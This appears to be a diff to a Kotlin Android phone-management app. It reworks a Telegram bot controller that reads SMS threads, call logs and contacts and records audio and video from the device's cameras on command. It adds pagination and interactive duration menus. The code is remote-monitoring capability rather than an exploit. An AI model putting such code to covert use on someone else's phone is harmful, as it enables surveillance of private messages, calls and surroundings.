@@ -88,8 +88,8 @@ object TelegramBotManager {
         "files" to "📁 Browse storage — tap folders to open, files to download",
         "screenshot" to "📸 Take a screenshot",
         "photo" to "📷 Camera photo — /photo [front|back]",
-        "audio" to "🎙 Record audio — /audio <seconds>",
-        "video" to "🎬 Record video — /video <seconds> [front|back]",
+        "audio" to "🎙 Record audio — interactive duration picker",
+        "video" to "🎬 Record video — pick camera, then duration",
         "apps" to "📱 List installed apps",
         "blockapp" to "🚫 Block an app — interactive picker",
         "unblockapp" to "✅ Unblock an app — interactive picker",
@@ -287,6 +287,18 @@ object TelegramBotManager {
         }
         val text = msg.optString("text", "").trim()
         if (text.isEmpty()) return
+
+        // If we're waiting for a free-form reply (e.g. "type custom duration"), consume it
+        // unless the user explicitly sends a new command.
+        val pi = pendingInput
+        if (pi != null && !text.startsWith("/")) {
+            pendingInput = null
+            scope.launch { consumePendingInput(pi, text) }
+            return
+        }
+        // Sending any /command cancels a pending input.
+        if (text.startsWith("/")) pendingInput = null
+
         val parts = text.split(" ")
         val command = parts[0].lowercase().trimStart('/')
             .substringBefore("@")
@@ -357,7 +369,65 @@ object TelegramBotManager {
                 when (key) {
                     "sms_open" -> {
                         TelegramApiClient.answerCallbackQuery(token, cqId, "Loading thread…")
-                        sendMessage(renderSmsThread(rest.filter { it.isDigit() }))
+                        renderSmsThreadPage(rest.filter { it.isDigit() }, offset = 0, editMessageId = null)
+                    }
+                    "sms_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        if (sep < 0) return@launch
+                        val tid = rest.substring(0, sep).filter { it.isDigit() }
+                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderSmsThreadPage(tid, off, editMessageId = messageId)
+                    }
+                    "calls_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val off = rest.toIntOrNull() ?: 0
+                        renderCallsPage(off, editMessageId = messageId)
+                    }
+                    "aud" -> {
+                        if (rest == "custom") {
+                            TelegramApiClient.answerCallbackQuery(token, cqId)
+                            pendingInput = "audio_duration"
+                            TelegramApiClient.editMessageText(
+                                token, chatId, messageId,
+                                "🎙 <b>Custom audio duration</b>\n\nReply with the number of <b>seconds</b> to record (1–300).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
+                            )
+                        } else {
+                            val n = rest.toIntOrNull()?.coerceIn(1, 300) ?: 10
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
+                            TelegramApiClient.editMessageText(token, chatId, messageId, "🎙 Recording <b>${n}s</b> of audio…")
+                            runAudioRecording(n)
+                        }
+                    }
+                    "vid_cam" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        showVideoDurationMenu(useFront = rest == "front", editMessageId = messageId)
+                    }
+                    "vid_cam_pick" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        showVideoCameraMenu(editMessageId = messageId)
+                    }
+                    "vid_custom" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        pendingInput = "video_duration:${if (rest == "front") "front" else "back"}"
+                        TelegramApiClient.editMessageText(
+                            token, chatId, messageId,
+                            "🎬 <b>Custom video duration</b> · ${if (rest == "front") "🤳 Front" else "📷 Back"} camera\n\nReply with the number of <b>seconds</b> to record (1–120).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
+                        )
+                    }
+                    "vid" -> {
+                        // rest = "<cam>:<seconds>"
+                        val sep = rest.indexOf(':')
+                        if (sep < 0) { TelegramApiClient.answerCallbackQuery(token, cqId); return@launch }
+                        val cam = rest.substring(0, sep)
+                        val n = rest.substring(sep + 1).toIntOrNull()?.coerceIn(1, 120) ?: 10
+                        val useFront = cam == "front"
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
+                        TelegramApiClient.editMessageText(
+                            token, chatId, messageId,
+                            "🎬 Recording <b>${n}s</b> · ${if (useFront) "🤳 Front" else "📷 Back"} camera…"
+                        )
+                        runVideoRecording(n, useFront)
                     }
                     "rec_get" -> {
                         TelegramApiClient.answerCallbackQuery(token, cqId, "Sending recording…")
@@ -544,26 +614,38 @@ object TelegramBotManager {
         sendTyping()
         val threadId = args[0].trim().filter { it.isDigit() }
         if (threadId.isEmpty()) { sendMessage("❌ Invalid thread id: <code>${htmlEsc(args[0])}</code>"); return }
-        sendMessage(renderSmsThread(threadId))
+        renderSmsThreadPage(threadId, offset = 0, editMessageId = null)
     }
 
-    private suspend fun renderSmsThread(threadId: String): String {
-        return try {
-            val messages = SmsHelper.searchAsync(MainApp.instance, "thread_id:$threadId", 30, 0)
-            if (messages.isEmpty()) {
-                "📭 No messages in thread $threadId"
-            } else {
-                val sb = StringBuilder("📨 <b>Thread $threadId</b> (${messages.size} messages)\n\n")
-                messages.reversed().forEachIndexed { _, m ->
-                    val dir = if (m.type == 1) "📥" else "📤"
-                    sb.append("$dir <b>${htmlEsc(m.address.ifBlank { "(unknown)" })}</b>  <i>${fmtTime(m.date.toEpochMilliseconds())}</i>\n")
-                    sb.append("   ${htmlEsc(m.body.take(300))}\n\n")
-                    if (sb.length > 3800) return@forEachIndexed
-                }
-                sb.toString()
+    private suspend fun renderSmsThreadPage(threadId: String, offset: Int, editMessageId: Long?) {
+        try {
+            val pageSize = 10
+            val messages = SmsHelper.searchAsync(MainApp.instance, "thread_id:$threadId", pageSize + 1, offset)
+            val hasMore = messages.size > pageSize
+            val pageItems = messages.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "📭 No messages in thread $threadId" else "📭 No more messages."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+                else sendMessage(msg)
+                return
             }
+            val sb = StringBuilder("📨 <b>Thread $threadId</b> · Showing ${offset + 1}–${offset + pageItems.size}\n\n")
+            // Show oldest-first within the page so threading reads naturally.
+            pageItems.reversed().forEach { m ->
+                val dir = if (m.type == 1) "📥" else "📤"
+                sb.append("$dir <b>${htmlEsc(m.address.ifBlank { "(unknown)" })}</b>  <i>${fmtTime(m.date.toEpochMilliseconds())}</i>\n")
+                sb.append("   ${htmlEsc(m.body.take(300))}\n\n")
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            if (offset > 0) nav.add("◀️ Prev" to "sms_pg:$threadId:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "sms_pg:$threadId:${offset + pageSize}")
+            val markup = if (nav.isNotEmpty()) TelegramApiClient.inlineKeyboard(listOf(nav)) else null
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
         } catch (e: Exception) {
-            "❌ Could not read thread: ${htmlEsc(e.message ?: "")}"
+            val msg = "❌ Could not read thread: ${htmlEsc(e.message ?: "")}"
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+            else sendMessage(msg)
         }
     }
 
@@ -581,12 +663,25 @@ object TelegramBotManager {
 
     private suspend fun cmdCalls(args: List<String>) {
         sendTyping()
-        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 20, 100)
+        // Optional explicit offset: /calls 20
+        val off = args.firstOrNull()?.toIntOrNull()?.coerceAtLeast(0) ?: 0
+        renderCallsPage(off, editMessageId = null)
+    }
+
+    private suspend fun renderCallsPage(offset: Int, editMessageId: Long?) {
         try {
-            val calls = CallMediaStoreHelper.searchAsync(MainApp.instance, "", limit, 0)
-            if (calls.isEmpty()) { sendMessage("📞 No call log entries."); return }
-            val sb = StringBuilder("📞 <b>Recent Calls</b> (${calls.size})\n\n")
-            calls.forEachIndexed { i, c ->
+            val pageSize = 10
+            val calls = CallMediaStoreHelper.searchAsync(MainApp.instance, "", pageSize + 1, offset)
+            val hasMore = calls.size > pageSize
+            val pageItems = calls.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "📞 No call log entries." else "📞 No more entries."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+                else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("📞 <b>Recent Calls</b> · Showing ${offset + 1}–${offset + pageItems.size}\n\n")
+            pageItems.forEachIndexed { i, c ->
                 val typeEmoji = when (c.type) {
                     CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                     CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
@@ -596,14 +691,20 @@ object TelegramBotManager {
                 }
                 val dur = if (c.duration > 0) " · ${c.duration}s" else ""
                 val name = if (c.name.isNotBlank()) " (${htmlEsc(c.name)})" else ""
-                sb.append("${i + 1}. $typeEmoji${dur}\n")
+                sb.append("${offset + i + 1}. $typeEmoji${dur}\n")
                 sb.append("   📱 <code>${htmlEsc(c.number)}</code>$name\n")
                 sb.append("   🕐 ${fmtTime(c.startedAt.toEpochMilliseconds())}\n\n")
-                if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
             }
-            sendMessage(sb.toString())
+            val nav = mutableListOf<Pair<String, String>>()
+            if (offset > 0) nav.add("◀️ Prev" to "calls_pg:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "calls_pg:${offset + pageSize}")
+            val markup = if (nav.isNotEmpty()) TelegramApiClient.inlineKeyboard(listOf(nav)) else null
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
         } catch (e: Exception) {
-            sendMessage("❌ Could not read call log: ${htmlEsc(e.message ?: "")}")
+            val msg = "❌ Could not read call log: ${htmlEsc(e.message ?: "")}"
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
+            else sendMessage(msg)
         }
     }
 
@@ -658,7 +759,8 @@ object TelegramBotManager {
             val title = if (query.isEmpty()) "👥 <b>Contacts</b>" else "👥 <b>Contacts</b> · <i>${htmlEsc(query.removePrefix("text:"))}</i>"
             val sb = StringBuilder("$title\nShowing ${offset + 1}–${offset + pageItems.size}\n\n")
             pageItems.forEachIndexed { i, c ->
-                sb.append("${offset + i + 1}. 👤 <b>${htmlEsc(c.fullName())}</b>\n")
+                val display = contactDisplayName(c)
+                sb.append("${offset + i + 1}. 👤 <b>${htmlEsc(display)}</b>\n")
                 c.phoneNumbers.forEachIndexed { j, ph ->
                     if (j < 3) sb.append("   📞 <code>${htmlEsc(ph.value)}</code>\n")
                 }
@@ -717,6 +819,9 @@ object TelegramBotManager {
     }
 
     /** Stable short-token cache so long paths fit Telegram's 64-byte callback_data limit. */
+    /** Holds a one-shot pending-input action keyed for the only authorised chat (single-chat bot). */
+    @Volatile private var pendingInput: String? = null
+
     private val pathTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
     private fun pathToken(path: String): String {
         val md = java.security.MessageDigest.getInstance("MD5")
@@ -889,8 +994,29 @@ object TelegramBotManager {
         }
     }
 
-    private suspend fun cmdAudio(args: List<String>) {
-        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 300) ?: 10
+    private fun cmdAudio(args: List<String>) {
+        // Backwards compat: `/audio 30` immediately starts a 30s recording.
+        val direct = args.firstOrNull()?.toIntOrNull()
+        if (direct != null) {
+            scope.launch { runAudioRecording(direct.coerceIn(1, 300)) }
+            return
+        }
+        showAudioDurationMenu(editMessageId = null)
+    }
+
+    private fun showAudioDurationMenu(editMessageId: Long?) {
+        val text = "🎙 <b>Record audio</b>\n\nChoose a duration:"
+        val rows = listOf(
+            listOf("5s" to "aud:5", "10s" to "aud:10", "30s" to "aud:30"),
+            listOf("1 min" to "aud:60", "2 min" to "aud:120", "5 min" to "aud:300"),
+            listOf("⌨️ Custom…" to "aud:custom"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
+        else sendMessage(text, replyMarkup = markup)
+    }
+
+    private suspend fun runAudioRecording(seconds: Int) {
         sendMessage("🎙 Recording ${seconds}s of audio…")
         sendRecordVoice()
         val file = recordAudio(MainApp.instance, seconds)
@@ -902,9 +1028,49 @@ object TelegramBotManager {
         }
     }
 
-    private suspend fun cmdVideo(args: List<String>) {
-        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 120) ?: 10
-        val useFront = args.getOrNull(1)?.lowercase() == "front"
+    private fun cmdVideo(args: List<String>) {
+        // Backwards compat: `/video 20 front` or `/video 20`.
+        val firstNum = args.firstOrNull()?.toIntOrNull()
+        if (firstNum != null) {
+            val useFront = args.getOrNull(1)?.lowercase() == "front"
+            scope.launch { runVideoRecording(firstNum.coerceIn(1, 120), useFront) }
+            return
+        }
+        // `/video front` or `/video back` → skip camera picker, go straight to durations.
+        val directCam = args.firstOrNull()?.lowercase()
+        if (directCam == "front" || directCam == "back") {
+            showVideoDurationMenu(useFront = directCam == "front", editMessageId = null)
+            return
+        }
+        showVideoCameraMenu(editMessageId = null)
+    }
+
+    private fun showVideoCameraMenu(editMessageId: Long?) {
+        val text = "🎬 <b>Record video</b>\n\nWhich camera?"
+        val rows = listOf(
+            listOf("📷 Back" to "vid_cam:back", "🤳 Front" to "vid_cam:front"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
+        else sendMessage(text, replyMarkup = markup)
+    }
+
+    private fun showVideoDurationMenu(useFront: Boolean, editMessageId: Long?) {
+        val cam = if (useFront) "front" else "back"
+        val label = if (useFront) "🤳 Front" else "📷 Back"
+        val text = "🎬 <b>Record video</b> · $label camera\n\nChoose a duration:"
+        val rows = listOf(
+            listOf("5s" to "vid:$cam:5", "10s" to "vid:$cam:10", "20s" to "vid:$cam:20"),
+            listOf("30s" to "vid:$cam:30", "1 min" to "vid:$cam:60", "2 min" to "vid:$cam:120"),
+            listOf("⌨️ Custom…" to "vid_custom:$cam"),
+            listOf("◀️ Change camera" to "vid_cam_pick"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
+        else sendMessage(text, replyMarkup = markup)
+    }
+
+    private suspend fun runVideoRecording(seconds: Int, useFront: Boolean) {
         sendMessage("🎬 Recording ${seconds}s video (${if (useFront) "front" else "back"} camera)…")
         sendUploadVideo()
         val file = recordVideo(MainApp.instance, seconds, useFront)
@@ -914,6 +1080,42 @@ object TelegramBotManager {
         } else {
             sendMessage("❌ Video recording failed. Ensure Camera & Microphone permissions are granted.")
         }
+    }
+
+    private suspend fun consumePendingInput(action: String, text: String) {
+        val parts = action.split(":")
+        when (parts[0]) {
+            "audio_duration" -> {
+                val n = text.trim().toIntOrNull()
+                if (n == null || n !in 1..300) {
+                    sendMessage("❌ Invalid duration. Send a number between 1 and 300, e.g. <code>45</code>.\nSend /audio to start over.")
+                    return
+                }
+                runAudioRecording(n)
+            }
+            "video_duration" -> {
+                val cam = parts.getOrNull(1) ?: "back"
+                val n = text.trim().toIntOrNull()
+                if (n == null || n !in 1..120) {
+                    sendMessage("❌ Invalid duration. Send a number between 1 and 120, e.g. <code>45</code>.\nSend /video to start over.")
+                    return
+                }
+                runVideoRecording(n, useFront = cam == "front")
+            }
+            else -> { /* ignore */ }
+        }
+    }
+
+    /** Robust display name for a contact: structured name → nickname → organization → first phone → "(no name)". */
+    private fun contactDisplayName(c: com.ismartcoding.plain.data.DContact): String {
+        val full = c.fullName().trim()
+        if (full.isNotEmpty()) return full
+        if (c.nickname.isNotBlank()) return c.nickname
+        val org = c.organization
+        if (org != null && org.company.isNotBlank()) return org.company
+        val phone = c.phoneNumbers.firstOrNull()?.value?.trim().orEmpty()
+        if (phone.isNotEmpty()) return phone
+        return "(no name)"
     }
 
     private suspend fun cmdApps(args: List<String>) {
